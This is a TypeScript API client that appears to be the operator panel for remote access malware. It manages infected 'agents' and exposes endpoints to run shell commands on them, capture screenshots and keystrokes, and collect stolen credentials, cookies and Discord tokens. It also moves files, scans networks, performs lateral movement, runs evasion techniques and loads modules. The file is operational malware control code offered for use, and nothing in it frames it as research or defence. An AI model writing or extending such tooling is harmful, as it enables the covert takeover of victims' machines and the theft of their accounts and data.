import axios, { AxiosInstance, InternalAxiosRequestConfig, AxiosResponse } from 'axios'
import type { Agent, Task, FileTransfer, Credential, Cookie, DiscordToken, Keystroke, Screenshot, ProcessInfo, LateralMove, EvasionAction, Module } from '@/types'

interface LoginResponse {
  token: string
  user: { username: string }
}

class APIService {
  private client: AxiosInstance
  private ws: WebSocket | null = null
  private wsUrl: string
  private messageHandlers: Map<string, (data: any) => void> = new Map()
  private reconnectAttempts = 0
  private maxReconnectAttempts = 5
  private reconnectDelay = 1000

  constructor() {
    this.wsUrl = (import.meta as any).env?.VITE_WS_URL || 'ws://localhost:8080/ws'
    this.client = axios.create({
      baseURL: '/api',
      timeout: 30000,
      headers: { 'Content-Type': 'application/json' }
    })

    this.client.interceptors.request.use((config: InternalAxiosRequestConfig) => {
      const token = localStorage.getItem('auth_token')
      if (token) {
        config.headers.Authorization = `Bearer ${token}`
      }
      return config
    })

    this.client.interceptors.response.use(
      (response: AxiosResponse) => response.data,
      (error) => {
        if (error.response?.status === 401) {
          localStorage.removeItem('auth_token')
          window.location.href = '/login'
        }
        return Promise.reject(error.response?.data?.error || error.message)
      }
    )
  }

  // Auth
  async login(username: string, password: string) {
    const data = await this.client.post<LoginResponse>('/auth/login', { username, password }) as unknown as LoginResponse
    if (data.token) localStorage.setItem('auth_token', data.token)
    return data
  }

  async logout() {
    await this.client.post('/auth/logout')
    localStorage.removeItem('auth_token')
    this.disconnectWS()
  }

  // Agents
  async getAgents(): Promise<Agent[]> {
    return this.client.get('/agents')
  }

  async getAgent(id: string): Promise<Agent> {
    return this.client.get(`/agents/${id}`)
  }

  async deleteAgent(id: string) {
    return this.client.delete(`/agents/${id}`)
  }

  async updateAgent(id: string, data: Partial<Agent>) {
    return this.client.patch(`/agents/${id}`, data)
  }

  async executeShell(agentId: string, command: string): Promise<Task> {
    return this.client.post(`/agents/${agentId}/shell`, { command })
  }

  async takeScreenshot(agentId: string): Promise<Task> {
    return this.client.post(`/agents/${agentId}/screenshot`, {})
  }

  async sleep(agentId: string, seconds: number): Promise<Task> {
    return this.client.post(`/agents/${agentId}/sleep`, { seconds })
  }

  async uninstall(agentId: string): Promise<Task> {
    return this.client.post(`/agents/${agentId}/uninstall`, {})
  }

  async updateAgentBinary(agentId: string, url: string): Promise<Task> {
    return this.client.post(`/agents/${agentId}/update`, { url })
  }

  // Tasks
  async getTasks(agentId: string): Promise<Task[]> {
    return this.client.get(`/agents/${agentId}/tasks`)
  }

  async getTask(id: string): Promise<Task> {
    return this.client.get(`/tasks/${id}`)
  }

  async cancelTask(id: string) {
    return this.client.post(`/tasks/${id}/cancel`)
  }

  // File Transfers
  async getFileTransfers(agentId: string): Promise<FileTransfer[]> {
    return this.client.get(`/agents/${agentId}/files`)
  }

  async uploadFile(agentId: string, file: File, remotePath: string): Promise<FileTransfer> {
    const formData = new FormData()
    formData.append('file', file)
    formData.append('remote_path', remotePath)
    return this.client.post(`/agents/${agentId}/files/upload`, formData, {
      headers: { 'Content-Type': 'multipart/form-data' }
    })
  }

  async downloadFile(agentId: string, remotePath: string): Promise<FileTransfer> {
    return this.client.post(`/agents/${agentId}/files/download`, { remote_path: remotePath })
  }

  async listDirectory(agentId: string, path: string): Promise<any[]> {
    return this.client.get(`/agents/${agentId}/files/list`, { params: { path } })
  }

  // Credentials
  async getCredentials(agentId: string): Promise<Credential[]> {
    return this.client.get(`/agents/${agentId}/credentials`)
  }

  async getCookies(agentId: string): Promise<Cookie[]> {
    return this.client.get(`/agents/${agentId}/cookies`)
  }

  async getDiscordTokens(agentId: string): Promise<DiscordToken[]> {
    return this.client.get(`/agents/${agentId}/discord`)
  }

  async getKeystrokes(agentId: string): Promise<Keystroke[]> {
    return this.client.get(`/agents/${agentId}/keystrokes`)
  }

  // Screenshots
  async getScreenshots(agentId: string): Promise<Screenshot[]> {
    return this.client.get(`/agents/${agentId}/screenshots`)
  }

  async downloadScreenshot(id: string): Promise<Blob> {
    return this.client.get(`/screenshots/${id}/download`, { responseType: 'blob' })
  }

  async deleteScreenshot(id: string) {
    return this.client.delete(`/screenshots/${id}`)
  }

  // Processes
  async getProcesses(agentId: string): Promise<ProcessInfo[]> {
    return this.client.get(`/agents/${agentId}/processes`)
  }

  async suspendProcess(agentId: string, pid: number) {
    return this.client.post(`/agents/${agentId}/processes/${pid}/suspend`)
  }

  async resumeProcess(agentId: string, pid: number) {
    return this.client.post(`/agents/${agentId}/processes/${pid}/resume`)
  }

  async killProcess(agentId: string, pid: number) {
    return this.client.post(`/agents/${agentId}/processes/${pid}/kill`)
  }

  // Lateral Movement
  async getLateralMoves(agentId: string): Promise<LateralMove[]> {
    return this.client.get(`/agents/${agentId}/lateral`)
  }

  async scanNetwork(agentId: string, range: string): Promise<any[]> {
    const res = await this.client.post(`/agents/${agentId}/lateral/scan`, { range })
    return res.data || res || []
  }

  async executeLateralMove(agentId: string, data: { technique: string; target: string; credentials_id?: string }): Promise<LateralMove> {
    return this.client.post(`/agents/${agentId}/lateral/execute`, data)
  }

  // Evasion
  async getEvasionResults(agentId: string): Promise<EvasionAction[]> {
    return this.client.get(`/agents/${agentId}/evasion`)
  }

  async executeEvasion(agentId: string, techniqueId: string): Promise<EvasionAction> {
    return this.client.post(`/agents/${agentId}/evasion/execute`, { technique_id: techniqueId })
  }

  // Modules
  async getModules(agentId: string): Promise<Module[]> {
    return this.client.get(`/agents/${agentId}/modules`)
  }

  async loadModule(agentId: string, moduleId: string) {
    return this.client.post(`/agents/${agentId}/modules/${moduleId}/load`)
  }

  async unloadModule(agentId: string, moduleId: string) {
    return this.client.post(`/agents/${agentId}/modules/${moduleId}/unload`)
  }

  // Stats
  async getStats(): Promise<any> {
    return this.client.get('/stats')
  }

  async getHealth(): Promise<any> {
    return this.client.get('/health')
  }

  // WebSocket
  connectWS(agentId?: string): Promise<void> {
    return new Promise((resolve, reject) => {
      if (this.ws?.readyState === WebSocket.OPEN) {
        resolve()
        return
      }

      const url = agentId ? `${this.wsUrl}?agent_id=${agentId}` : this.wsUrl
      this.ws = new WebSocket(url)

      this.ws.onopen = () => {
        this.reconnectAttempts = 0
        console.log('[WS] Connected')
        resolve()
      }

      this.ws.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data)
          const handler = this.messageHandlers.get(msg.type)
          if (handler) handler(msg.payload)
        } catch (e) {
          console.error('[WS] Parse error:', e)
        }
      }

      this.ws.onclose = () => {
        console.log('[WS] Disconnected')
        this.attemptReconnect(agentId)
      }

      this.ws.onerror = (err) => {
        console.error('[WS] Error:', err)
        reject(err)
      }
    })
  }

  private attemptReconnect(agentId?: string) {
    if (this.reconnectAttempts < this.maxReconnectAttempts) {
      this.reconnectAttempts++
      setTimeout(() => this.connectWS(agentId), this.reconnectDelay * this.reconnectAttempts)
    }
  }

  disconnectWS() {
    if (this.ws) {
      this.ws.close()
      this.ws = null
    }
  }

  sendWS(type: string, payload: any) {
    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify({ type, payload }))
    }
  }

  onMessage(type: string, handler: (data: any) => void) {
    this.messageHandlers.set(type, handler)
  }

  offMessage(type: string) {
    this.messageHandlers.delete(type)
  }
}

export const api = new APIService()